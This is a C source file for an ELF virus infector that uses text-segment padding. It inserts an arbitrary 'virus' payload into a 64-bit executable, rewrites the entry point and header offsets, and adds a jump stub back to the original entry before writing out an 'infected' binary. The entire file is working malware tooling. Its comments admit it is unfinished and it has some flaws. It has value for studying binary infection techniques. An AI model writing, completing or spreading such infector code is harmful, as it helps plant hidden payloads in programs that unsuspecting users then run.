#include <elf.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
#include <string.h>

int main(int argc, char **argv){
    Elf64_Ehdr *ehdr;
    Elf64_Addr text_segment_end, orig_entry_point;
    struct stat st;
    char * mem;
    int page_size, size_program, size_virus, i;
    
    char jmp_entry [] = "\x48\xb8\xd0\x05\x10\x00\x00\x00\x00\x00" //mov rax,0x4141414141414141
                        "\xff\xe0"; // jmp rax

    // better is position independent 
    // jmp rip-text_segment_len-10

    int jmp_len = 12;


    if(argc != 3){
        printf("usage silvinfect <program> <virus>\n");
        exit(0);
    }

    // get page_size
    page_size = getpagesize();
    printf("page size: %d\n", page_size);

    int fd_program = open(argv[1], O_RDONLY);
    int fd_virus = open(argv[2], O_RDONLY);


    fstat(fd_program, &st);
    size_program = st.st_size;

    fstat(fd_virus, &st);
    size_virus = st.st_size;
    size_virus += jmp_len;

    char * parasite = malloc(size_virus);
    read(fd_virus, parasite, size_virus);

    mem = mmap(NULL, size_program, PROT_READ+PROT_WRITE, MAP_PRIVATE, fd_program, 0);
    ehdr = (Elf64_Ehdr *)mem;

    // Increase the section header offset by PAGE_SIZE in the ELF file header.
    Elf64_Shdr *shdr = (Elf64_Shdr *)(mem + ehdr->e_shoff);
    ehdr->e_shoff = ehdr->e_shoff + page_size;

    orig_entry_point = ehdr->e_entry;
    // PROBLEM: IF ELF type is ET_DYN (shared object - like 99% of all ELFs, finding the entry point at runtime is a problem...
    
    // Locate the text segment program header:
    Elf64_Phdr *phdr = (Elf64_Phdr *)(mem + ehdr->e_phoff);
    for (i = 0; i < ehdr->e_phnum; i++){
        //if ((phdr[i].p_type == PT_LOAD) & (phdr[i].p_offset == 0)){
         if ((phdr[i].p_type == PT_LOAD) & (phdr[i].p_flags == PF_X + PF_R)){  
            printf("Phdr (text segment) num: %d\n", i);
            //text_segment_end = phdr[i].p_filesz;
            text_segment_end = phdr[i].p_offset + phdr[i].p_filesz;
            printf("text segment end (offset): %ld\n", text_segment_end);
            
            // Modify the entry point to the parasite location.
            ehdr->e_entry = phdr[i].p_filesz + phdr[i].p_vaddr;

            // Increase memory anf file size by the size of the parasite.
            phdr[i].p_filesz += size_virus;
            phdr[i].p_memsz += size_virus;
            
            // For each program header whose segment is after the parasite, increase it's offset by PAGE_SIZE.
            for (int j = i + 1; j < ehdr->e_phnum; j++){
                phdr[j].p_offset += page_size;
            }
            break;
        }
    } 


    //Find the last section header in the text segment and increase it's size by the length of the parasite.
    for (i = 0; i < ehdr->e_shnum; i++){
        // For every section header that exists after the parasite insertion, increase it's offset by PAGE_SIZE.
        if (shdr[i].sh_offset > text_segment_end){
            shdr[i].sh_offset += page_size;
        }

        else if((shdr[i].sh_offset + shdr[i].sh_size) == text_segment_end){
            printf("found last section header (index %d) of text segment at offset %ld with size %ld\n", i, shdr[i].sh_offset, shdr[i].sh_size);

            shdr[i].sh_size += size_virus;
        }
        

    }

    // Design new ELF file
    char * virus = malloc(size_program + page_size);
    
    // ELF header, program header and text_segment
    memcpy(virus, mem, text_segment_end);
   
    // virus
    memcpy(virus + text_segment_end, parasite, size_virus - jmp_len);

    // jmp command
    // at first, patch the jmp entry (414141 to the orig_entry address);
    memcpy(&jmp_entry[2], (char *)&orig_entry_point, 8);
    memcpy(virus + text_segment_end + size_virus - jmp_len, jmp_entry, jmp_len);

    // rest
    memcpy(virus + text_segment_end + page_size, mem + text_segment_end, size_program - text_segment_end);

    // write new ELF file to new file
    int fd_infected = open("infected", O_CREAT + O_RDWR);
    if (fd_infected <= 0){
        perror("open");
        exit(1);
    }
    printf("wrote %ld\n", write(fd_infected, virus, size_program + page_size));
    
    free(virus);
    close(fd_infected);
    close(fd_program);
    close(fd_virus);
    return 0;

}
